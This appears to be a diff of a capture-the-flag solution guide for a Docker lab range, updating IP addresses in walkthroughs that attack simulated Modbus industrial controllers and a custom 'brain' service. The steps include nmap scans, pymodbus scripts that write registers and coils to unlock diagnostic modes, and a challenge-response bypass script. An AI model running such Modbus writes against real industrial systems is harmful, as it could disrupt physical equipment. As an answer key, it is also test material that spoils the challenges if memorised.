@@ -2,14 +2,15 @@
 
 > **Start here:** Read [00-range-access-docker.md](00-range-access-docker.md) for how to access the Docker compose range.
 
-These flags require the collective gate (flag 19) to have been triggered first in production. **Bunker network (172.20.40.x) is NOT reachable from Kali.** Access is via the splice landing box (A9 at 172.20.40.5).
+These flags require the collective gate (flag 19) to have been triggered first in production. **Bunker network (172.20.50.x) is NOT reachable from Kali.** Access is via the splice landing box (A9 at 172.20.50.5).
 
 For testing, exec into A9: `sudo docker exec -it a9-splice /bin/sh`
-From A9, the controllers are at their production ports:
-- A10 tail: **172.20.40.10:502**
-- A11 leg: **172.20.40.11:502**
-- A12 arms: **172.20.40.12:502**
-- A13 brain: **172.20.40.50:9100**
+From A9, the controllers are at their production ports (reachable by
+hostname via docker DNS or by IP):
+- A10 tail: **tail-ctrl** / **172.20.50.10:502**
+- A11 leg: **leg-ctrl** / **172.20.50.11:502**
+- A12 arms: **arms-ctrl** / **172.20.50.12:502**
+- A13 brain: **brain-main** / **172.20.50.50:9100**
 
 ---
 
@@ -17,20 +18,20 @@ From A9, the controllers are at their production ports:
 
 1. From the splice landing box (A9), scan the OT network. Pre-populated scan results are at `/root/scan_results.txt`, or run:
    ```
-   nmap -sV -p 502,9100 10.10.40.0/24
+   nmap -sV -p 502,9100 172.20.50.0/24
    ```
-   You'll find four hosts: 10.10.40.10, .11, .12 (Modbus/TCP 502) and 10.10.40.50 (TCP 9100).
+   You'll find four hosts: 172.20.50.10, .11, .12 (Modbus/TCP 502) and 172.20.50.50 (TCP 9100).
 
 2. Query each controller's device identification using Modbus function code 43. Use the helper script:
    ```
-   python3 /usr/local/bin/modbus_client.py (test env: /tmp/a9-content/modbus_client.py) 10.10.40.10 devid
-   python3 /usr/local/bin/modbus_client.py (test env: /tmp/a9-content/modbus_client.py) 10.10.40.11 devid
-   python3 /usr/local/bin/modbus_client.py (test env: /tmp/a9-content/modbus_client.py) 10.10.40.12 devid
+   python3 /usr/local/bin/modbus_client.py 172.20.50.10 devid
+   python3 /usr/local/bin/modbus_client.py 172.20.50.11 devid
+   python3 /usr/local/bin/modbus_client.py 172.20.50.12 devid
    ```
    Each returns a model number:
-   - 10.10.40.10: `AHS-TAIL-7741`
-   - 10.10.40.11: `AHS-LEG-MN07`
-   - 10.10.40.12: `AHS-ARM-AL42`
+   - 172.20.50.10: `AHS-TAIL-7741`
+   - 172.20.50.11: `AHS-LEG-MN07`
+   - 172.20.50.12: `AHS-ARM-AL42`
 
 3. Concatenate the three model numbers in network order: `AHS-TAIL-7741AHS-LEG-MN07AHS-ARM-AL42`
 
@@ -50,7 +51,7 @@ From A9, the controllers are at their production ports:
 3. Execute the unlock sequence via Modbus:
    ```python
    from pymodbus.client import ModbusTcpClient
-   c = ModbusTcpClient("10.10.40.10", port=502)
+   c = ModbusTcpClient("172.20.50.10", port=502)
    c.connect()
    c.write_register(address=20, value=3)    # diagnostic mode
    c.write_register(address=99, value=482)  # serial challenge
@@ -76,7 +77,7 @@ From A9, the controllers are at their production ports:
    ```python
    from pymodbus.client import ModbusTcpClient
    import time
-   c = ModbusTcpClient("10.10.40.11", port=502)
+   c = ModbusTcpClient("172.20.50.11", port=502)
    c.connect()
    for mode in [0, 1, 2, 0]:
        c.write_register(address=30, value=mode)
@@ -117,7 +118,7 @@ From A9, the controllers are at their production ports:
    ```python
    from pymodbus.client import ModbusTcpClient
    import time
-   c = ModbusTcpClient("10.10.40.12", port=502)
+   c = ModbusTcpClient("172.20.50.12", port=502)
    c.connect()
 
    c.write_coil(address=50, value=True)          # enable diagnostics
@@ -148,7 +149,7 @@ From A9, the controllers are at their production ports:
 
 ## Flag 35 — Mecha-Godzilla Brain Access (Expert, 300pts)
 
-1. The brain at 10.10.40.50:9100 speaks a custom binary protocol. Connecting with plain netcat shows garbled bytes — that's the 8-byte challenge.
+1. The brain at 172.20.50.50:9100 speaks a custom binary protocol. Connecting with plain netcat shows garbled bytes — that's the 8-byte challenge.
 
 2. Find the protocol documentation in A7: clone `aurora/weapons-integration` and read `src/brain_client.py`. It documents:
    - Server sends 8-byte challenge
@@ -169,7 +170,7 @@ From A9, the controllers are at their production ports:
    key = hashlib.sha256(serials.encode()).digest()[:8]
 
    s = socket.socket()
-   s.connect(("10.10.40.50", 9100))
+   s.connect(("172.20.50.50", 9100))
    challenge = s.recv(8)
    response = bytes(c ^ k for c, k in zip(challenge, key))
    s.sendall(response)
